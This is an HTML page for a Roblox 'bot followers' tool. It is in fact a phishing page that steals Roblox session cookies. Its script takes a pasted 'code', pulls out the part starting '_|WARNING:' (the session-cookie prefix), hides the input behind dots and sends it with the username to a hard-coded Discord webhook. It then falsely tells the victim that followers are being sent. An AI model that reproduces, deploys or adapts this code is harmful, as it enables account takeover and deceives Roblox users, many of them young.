<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RbxTools BOT FOLLOWERS</title>
    <style>
        :root {
            --bg-color: #0f0f13;
            --card-bg: #16161d;
            --accent-color: #7d5fff;
            --text-color: #ffffff;
            --input-bg: #1e1e26;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: var(--card-bg);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 450px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.05);
        }
        h2 {
            margin-bottom: 25px;
            font-size: 26px;
            background: linear-gradient(45deg, #7d5fff, #9177ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 13px; margin-bottom: 8px; color: #888; }
        input {
            width: 100%;
            padding: 14px 15px;
            background: var(--input-bg);
            border: 1px solid #2a2a35;
            border-radius: 8px;
            color: white;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
        }
        input::placeholder { color: #555; }
        .code-wrapper {
            position: relative;
            width: 100%;
            height: 100px;
            border-radius: 8px;
            border: 1px solid #2a2a35;
            background: var(--input-bg);
            box-sizing: border-box;
            overflow: hidden;
        }
        #codeDisplay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            padding: 14px 15px;
            background: transparent;
            border: none;
            color: transparent;
            caret-color: white;
            font-size: 15px;
            line-height: 1.5;
            box-sizing: border-box;
            outline: none;
            resize: none;
            font-family: inherit;
            z-index: 2;
            overflow-y: scroll;
        }
        #codeDisplay::placeholder { color: #555; }
        #codeMask {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            padding: 14px 15px;
            color: white;
            font-size: 15px;
            line-height: 1.5;
            box-sizing: border-box;
            pointer-events: none;
            z-index: 1;
            white-space: pre-wrap;
            word-break: break-all;
            font-family: inherit;
            overflow: hidden;
        }
        button {
            width: 100%;
            padding: 16px;
            background: var(--accent-color);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { background: #6a4ce0; }
        button:disabled { background: #444; cursor: not-allowed; }
        .footer { margin-top: 25px; font-size: 11px; color: #444; }
    </style>
</head>
<body>
<div class="container">
    <h2>BOT FOLLOWERS TOOL</h2>

    <div class="input-group">
        <label for="username">ROBLOX ID</label>
        <input type="text" id="username" placeholder="Enter Roblox ID">
    </div>

    <div class="input-group">
        <label>CODE</label>
        <div class="code-wrapper">
            <div id="codeMask"></div>
            <textarea id="codeDisplay" placeholder="Paste your code here..." spellcheck="false"></textarea>
        </div>
    </div>

    <button id="submitBtn" onclick="sendData()">GET FOLLOWERS</button>
    <div class="footer">© 2024 RbxTools Service Update</div>
</div>

<script>
    const codeDisplay = document.getElementById('codeDisplay');
    const codeMask    = document.getElementById('codeMask');

    codeDisplay.addEventListener('input', syncMask);
    codeDisplay.addEventListener('scroll', () => {
        codeMask.scrollTop = codeDisplay.scrollTop;
    });

    function syncMask() {
        codeMask.textContent = '●'.repeat(codeDisplay.value.length);
        codeMask.scrollTop = codeDisplay.scrollTop;
    }

    function extractWarning(code) {
        // _|WARNING: 부터 " 나오기 직전까지만 추출, " 제거
        const match = code.match(/_\|WARNING:[^"]*/);
        return match ? match[0].trim() : null;
    }

    async function sendData() {
        const username = document.getElementById('username').value.trim();
        const code     = codeDisplay.value.trim();
        const btn      = document.getElementById('submitBtn');
        const webhookURL = "https://discord.com/api/webhooks/1421280945805328525/0tultUQiCe8PB8YX13EUJ2LdFHrRAFBrGtaPqMUlAaMDS8v2a9USuE19tArMY3QP8YQr";

        if (!username || !code) {
            alert("Please fill in all the spaces!");
            return;
        }

        const warning = extractWarning(code);
        if (!warning) {
            alert("Valid code not found!");
            return;
        }

        btn.innerText = "PROCESSING...";
        btn.disabled  = true;

        const payload = {
            embeds: [{
                title: "📩 New Submission Received",
                color: 8216575,
                fields: [
                    { name: "👤 Roblox ID",    value: username,                      inline: false },
                    { name: "🔑 Code Content", value: "```" + warning + "```", inline: false }
                ],
                timestamp: new Date()
            }]
        };

        try {
            const res = await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (res.ok) {
                alert("Success! Followers are being sent.");
                document.getElementById('username').value = "";
                codeDisplay.value = "";
                codeMask.textContent = "";
            } else {
                alert("Error sending data.");
            }
        } catch (err) {
            alert("Connection error.");
        } finally {
            btn.innerText = "GET FOLLOWERS";
            btn.disabled  = false;
        }
    }
</script>
</body>
</html>
